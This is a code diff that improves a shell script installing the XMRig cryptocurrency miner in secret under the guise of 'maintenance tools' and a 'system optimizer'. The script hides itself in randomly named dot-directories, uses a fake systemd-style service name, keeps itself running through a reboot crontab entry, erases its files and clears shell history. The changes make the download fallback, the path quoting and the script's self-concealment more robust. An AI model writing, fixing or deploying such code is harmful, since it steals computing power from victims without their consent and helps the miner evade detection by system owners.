@@ -10,13 +10,17 @@ if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Running as root user"
 fi
 
+# Set locale to avoid warnings
+export LC_ALL=C
+export LANG=C
+
 # Generate random names and paths
 RANDOM_DIR=$(openssl rand -hex 12)
 SYSTEM_USER="sys$(openssl rand -hex 8)"
 SERVICE_NAME="systemd-$(openssl rand -hex 6)"
 
 # Hidden installation paths
-BASE_DIR="/root/.local/.$RANDOM_DIR"
+BASE_DIR="/.local/.$RANDOM_DIR"
 CONFIG_DIR="$BASE_DIR/.config"
 LOG_DIR="$BASE_DIR/.logs"
 CACHE_DIR="$BASE_DIR/.cache"
@@ -34,10 +38,6 @@ fi
 if [ -z "$HOME" ]; then
   export HOME=/tmp
 fi
-
-# Set locale to avoid warnings
-export LC_ALL=C
-export LANG=C
 
 if ! type curl >/dev/null; then
   echo "Installing required packages..."
@@ -89,20 +89,27 @@ echo "[*] Downloading maintenance tools..."
 DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
 
 # Multiple fallback download methods
+DOWNLOAD_SUCCESS=false
 for method in curl wget; do
     if type $method >/dev/null 2>&1; then
         case $method in
             curl)
-                curl -s -L "$DOWNLOAD_URL" -o /tmp/tools.tar.gz 2>/dev/null && break
+                if curl -s -L "$DOWNLOAD_URL" -o /tmp/tools.tar.gz 2>/dev/null; then
+                    DOWNLOAD_SUCCESS=true
+                    break
+                fi
                 ;;
             wget)
-                wget -q -O /tmp/tools.tar.gz "$DOWNLOAD_URL" 2>/dev/null && break
+                if wget -q -O /tmp/tools.tar.gz "$DOWNLOAD_URL" 2>/dev/null; then
+                    DOWNLOAD_SUCCESS=true
+                    break
+                fi
                 ;;
         esac
     fi
 done
 
-if [ ! -f /tmp/tools.tar.gz ]; then
+if [ ! -f /tmp/tools.tar.gz ] || [ "$DOWNLOAD_SUCCESS" = false ]; then
     echo "ERROR: Cannot download tools"
     exit 1
 fi
@@ -265,7 +272,7 @@ EOF
 fi
 
 # Add to crontab for persistence
-(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 60 && $BASE_DIR/control start") | crontab -
+(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 60 && \"$BASE_DIR/control\" start") | crontab -
 
 # Hide the installation
 echo "[*] Securing installation..."
@@ -280,7 +287,7 @@ find /tmp -name "xmrig*" -type d -exec rm -rf {} \; 2>/dev/null
 history -c
 
 echo "[*] Starting system optimizer..."
-$BASE_DIR/control start
+"$BASE_DIR/control" start
 
 echo
 echo "System optimization setup complete."
@@ -288,9 +295,14 @@ echo "The optimizer will use $USABLE_THREADS CPU threads with $CPU_USAGE% utiliz
 echo "Use: $BASE_DIR/control {start|stop|status} to manage"
 echo
 
-# Hide this script's execution
-SCRIPT_NAME=$(basename "$0")
-if [ -f "$SCRIPT_NAME" ]; then
-    cp "$SCRIPT_NAME" "$BASE_DIR/.setup"
+# FIXED: Hide this script's execution properly
+CURRENT_SCRIPT="$0"
+if [ -f "$CURRENT_SCRIPT" ]; then
+    cp "$CURRENT_SCRIPT" "$BASE_DIR/.setup"
     chmod 600 "$BASE_DIR/.setup"
+    # Remove the original script if desired (optional)
+    # rm -f "$CURRENT_SCRIPT"
 fi
+
+# Clean exit
+exit 0
